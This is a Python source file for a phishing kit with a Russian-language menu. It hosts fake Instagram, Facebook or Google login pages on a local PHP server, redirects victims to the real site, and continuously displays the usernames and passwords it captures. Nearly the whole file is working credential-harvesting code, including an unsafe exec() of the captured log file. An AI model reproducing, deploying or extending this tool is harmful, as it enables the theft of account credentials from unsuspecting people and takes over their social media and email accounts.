import os, sys, time
import random
import json
from multiprocessing import Process
from time import sleep
from prettytable import PrettyTable
import requests

os.system('clear || cls')
class A:
    def __call__(self, count=10, sleep_time=0.5):
        if used == "1":
            os.system("cd www/instagram && php -S localhost:"+str(ports))
        elif used == "2":
            os.system("cd www/facebook && php -S localhost:"+str(ports))
        elif used == "3":
            os.system("cd www/google && php -S localhost:"+str(ports))
        else:
            exit()  
with open('www/info/metadata.json') as data:
    meta = json.load(data)
logo=(f"""\n
┌─┐┌─┐┌─┐┌─┐┌─┐┌┐┌┌─┐┌─┐┬─┐┌─┐
├─┘├─┤└─┐└─┐├┤ ││││ ┬├┤ ├┬┘└─┐
┴  ┴ ┴└─┘└─┘└─┘┘└┘└─┘└─┘┴└─└─┘
[>] Version     : {meta['version']}
 |--> btc: {meta['donate']['btc']}          
 |--> eth: {meta['donate']['eth']}
[>] Telegram    : {meta['telegram']}\n""")  
def upd():
    try:
        rqst = requests.get(f"{meta['url']}", timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            metadata = rqst.text
            json_data = json.loads(metadata)
            gh_version = json_data['version']
            if (str(gh_version) > meta['version']):
                print(logo)
                print(f'\n[>]New Update Available : {gh_version}')
                print(' |--> Please install     : https://github.com/oldnum/betarla')
                print(f'[>]New Update Available : {gh_version}')
                exit()
            else:
                pass
    except Exception as exc:
        pass
upd()
class B:
    def __call__(self, count=10, sleep_time=0.5):
        if used == "1":
            while True:
                x = PrettyTable()
                x.field_names = ['OS', 'login', 'password']
                g=0
                exec(open('www/instagram/log.log').read())
                print(x)
                time.sleep(1)
                os.system("clear")

        elif used == "2":
            while True:
                x = PrettyTable()
                x.field_names = ['OS', 'login', 'password']
                g=0
                exec(open('www/facebook/log.log').read())
                print(x)
                time.sleep(1)
                os.system("clear")

        elif used == "3":
            while True:
                x = PrettyTable()
                x.field_names = ['OS', 'login', 'password']
                g=0
                exec(open('www/google/log.log').read())
                print(x)
                time.sleep(1)
                os.system("clear")

        else:
            exit()

print(logo,"""
[0] История 
[1] Instagram
[2] Facebook
[3] Google
""")


used = input("Введите номер: ")
if used == "0":
    try:
        os.system("clear || cls")
        print(logo)
        x = open('result.log', 'r')
        print(x.read())
        exit()
    except:
        exit()
elif used =="1":
    with open("www/instagram/log.log", "w") as f1:
        pass       
    with open("www/instagram/location.location", 'w') as f11:
        f11.write("https://instagram.com")
elif used =="2":
    with open("www/facebook/log.log", "w") as f2:
        pass       
    with open("www/facebook/location.location", 'w') as f21:
        f21.write("https://facebook.com")
elif used =="3":
    with open("www/google/log.log", "w") as f2:
        pass       
    with open("www/google/location.location", 'w') as f21:
        f21.write("https://google.com")
else:
    exit()
ports = input("Порт: ")
reloc = input("Редирект or (enter): ")
if ports == "":
    ports=8080
if __name__ == '__main__':
    a = A()
    b = B()

    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
    p2 = Process(target=b, args=(12,))
    p1.start()
    p2.start()

    p1.join()
    p2.join()
